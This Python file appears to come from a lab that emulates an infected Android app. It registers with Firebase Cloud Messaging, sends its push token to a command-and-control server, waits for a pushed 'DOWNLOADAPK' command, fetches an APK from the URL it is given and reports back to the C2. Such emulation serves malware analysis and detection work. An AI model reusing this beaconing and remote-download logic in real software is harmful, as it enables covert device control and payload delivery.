from __future__ import annotations

import datetime as dt
import json
import queue
import socket
import ssl
import threading
import urllib.parse
from dataclasses import dataclass

from .config import LabConfig
from .dns_client import DnsResolver
from .http_wire import send_http_request
from .logging_utils import log


@dataclass
class VictimClient:
    config: LabConfig
    resolver: DnsResolver
    tls_context: ssl.SSLContext
    stop_event: threading.Event

    def __post_init__(self) -> None:
        self.push_queue: "queue.Queue[str]" = queue.Queue()
        self.first_download_started = True
        self.download_complete = False
        self.downloaded_package_name = ""
        self.registration_token = ""
        self.push_thread: threading.Thread | None = None

    def run_sequence(self) -> None:
        fid = self._create_installation()
        token = self._register_fcm(fid)
        self.registration_token = token
        self._start_push_listener(token)
        self._post_token_to_c2(token)
        command = self._wait_for_fcm_command()
        self._process_fcm_command(command)

    def _create_installation(self) -> str:
        host = self.config.firebase_api.host
        ip = self.resolver.resolve_a(host)
        payload = json.dumps(
            {
                "fid": "",
                "appId": self.config.firebase_app_id,
                "authVersion": "FIS_v2",
                "sdkVersion": "a:17.1.3",
            },
            separators=(",", ":"),
        ).encode("utf-8")
        log("victim", "Firebase Installations create")
        response = send_http_request(
            ip=ip,
            port=self.config.firebase_api.port,
            host=host,
            method="POST",
            path=self.config.fcm_installations_path,
            headers={
                "Content-Type": "application/json",
                "X-Android-Package": "lincoln.auy.iAssist",
                "X-Goog-Api-Key": self.config.api_key,
                "User-Agent": self.config.user_agent_android,
            },
            body=payload,
            timeout=self.config.timeout_seconds,
            tls=True,
            tls_context=self.tls_context,
        )
        data = json.loads(response.text)
        log("victim", f"Firebase Installations HTTP {response.status} fid={data['fid']}")
        return data["fid"]

    def _register_fcm(self, fid: str) -> str:
        host = self.config.android_api_host
        ip = self.resolver.resolve_a(host)
        form = urllib.parse.urlencode(
            {
                "scope": "*",
                "sender": self.config.sender_id,
                "appid": fid,
                "app": "lincoln.auy.iAssist",
            }
        ).encode("utf-8")
        log("victim", f"FCM RPC register scope=* sender={self.config.sender_id} appid={fid}")
        response = send_http_request(
            ip=ip,
            port=self.config.firebase_api.port,
            host=host,
            method="POST",
            path=self.config.fcm_register_path,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": self.config.user_agent_android,
            },
            body=form,
            timeout=self.config.timeout_seconds,
            tls=True,
            tls_context=self.tls_context,
        )
        parsed = urllib.parse.parse_qs(response.text)
        token = parsed.get("registration_id", [""])[0]
        log("victim", f"onNewToken({token}) from HTTP {response.status}")
        return token

    def _start_push_listener(self, token: str) -> None:
        self.push_thread = threading.Thread(target=self._push_listener_loop, args=(token,), daemon=True)
        self.push_thread.start()

    def _push_listener_loop(self, token: str) -> None:
        host = self.config.mtalk.host
        ip = self.resolver.resolve_a(host)
        with socket.create_connection((ip, self.config.mtalk.port), timeout=self.config.timeout_seconds) as sock:
            with self.tls_context.wrap_socket(sock, server_hostname=host) as conn:
                conn.settimeout(0.5)
                hello = f"FCM_CONNECT token={token} app=lincoln.auy.iAssist\n".encode("utf-8")
                conn.sendall(hello)
                _ = _recv_line(conn)
                log("victim", "FCM TLS push channel established")
                while not self.stop_event.is_set():
                    try:
                        line = _recv_line(conn)
                    except TimeoutError:
                        continue
                    if not line:
                        break
                    payload = line.decode("utf-8", errors="replace").strip()
                    if payload:
                        log("victim", f"RemoteMessage data={payload}")
                        self.push_queue.put(payload)
                        break

    def _post_token_to_c2(self, token: str) -> None:
        body = urllib.parse.urlencode(
            {
                "CMD": "Token",
                "Uid": self.config.uid,
                "Token": token,
            }
        ).encode("utf-8")
        self._post_c2(body, "Token")

    def _wait_for_fcm_command(self) -> str:
        payload = self.push_queue.get(timeout=self.config.timeout_seconds)
        data = json.loads(payload)
        return data["data"]["CMD"]

    def _process_fcm_command(self, command: str) -> None:
        log("victim", "ehy.onMessageReceived -> processCMD")
        log("victim", "Oce.onStartCommand -> aes()")
        if not command.startswith("DOWNLOADAPK:::"):
            raise RuntimeError(f"unexpected command: {command}")
        download_url = command.split(":::", 1)[1]
        ack = f"D:::{_stamp()} -- {command} has been executed - OK##-##"
        self._post_insert_server_cmd(ack)
        apk = self._download_apk(download_url)
        self.download_complete = bool(apk)
        self.downloaded_package_name = "lincoln.auy.iAssist"
        log("victim", "DownloadManager guarda Downloads/AApk.apk")
        log("victim", "Tbk.onReceive(DOWNLOAD_COMPLETE)")
        if self.first_download_started:
            self.first_download_started = False
            send_message = "SendMessage:::firstDownloadCompleted!"
            log("victim", f"processCMD={send_message}")
            complete = f"D:::{_stamp()} -- firstDownloadCompleted!##-##"
            self._post_insert_server_cmd(complete)
            generic_ack = f"D:::{_stamp()} -- {send_message} has been executed - OK##-##"
            self._post_insert_server_cmd(generic_ack)

    def _download_apk(self, url: str) -> bytes:
        parsed = urllib.parse.urlparse(url)
        if parsed.scheme != "http":
            raise RuntimeError(f"DownloadManager.Request expected http URI in this lab, got {url}")
        host = parsed.hostname or self.config.download.host
        port = parsed.port or 80
        path = parsed.path or "/"
        ip = self.resolver.resolve_a(host)
        log("victim", f"DownloadManager GET {url}")
        response = send_http_request(
            ip=ip,
            port=port,
            host=host,
            method="GET",
            path=path,
            headers={
                "User-Agent": self.config.user_agent_download_manager,
                "Accept-Encoding": "identity",
            },
            timeout=self.config.timeout_seconds,
        )
        log("victim", f"APK download HTTP {response.status} bytes={len(response.body)}")
        return response.body

    def _post_insert_server_cmd(self, server_cmd: str) -> None:
        body = urllib.parse.urlencode(
            {
                "CMD": "insertServerCMD",
                "Uid": self.config.uid,
                "ServerCMD": server_cmd,
            }
        ).encode("utf-8")
        self._post_c2(body, "insertServerCMD")

    def _post_c2(self, body: bytes, operation: str) -> None:
        ip = self.resolver.resolve_a(self.config.c2.host)
        log("victim", f"POST C2 {operation}")
        response = send_http_request(
            ip=ip,
            port=self.config.c2.port,
            host=self.config.c2.host,
            method="POST",
            path=self.config.c2_path,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": self.config.user_agent_android,
            },
            body=body,
            timeout=self.config.timeout_seconds,
        )
        log("victim", f"C2 HTTP {response.status} body={response.text.strip()!r}")


def _stamp() -> str:
    return dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def _recv_line(conn: ssl.SSLSocket) -> bytes:
    chunks: list[bytes] = []
    while True:
        chunk = conn.recv(1)
        if not chunk:
            break
        chunks.append(chunk)
        if chunk == b"\n":
            break
    return b"".join(chunks)
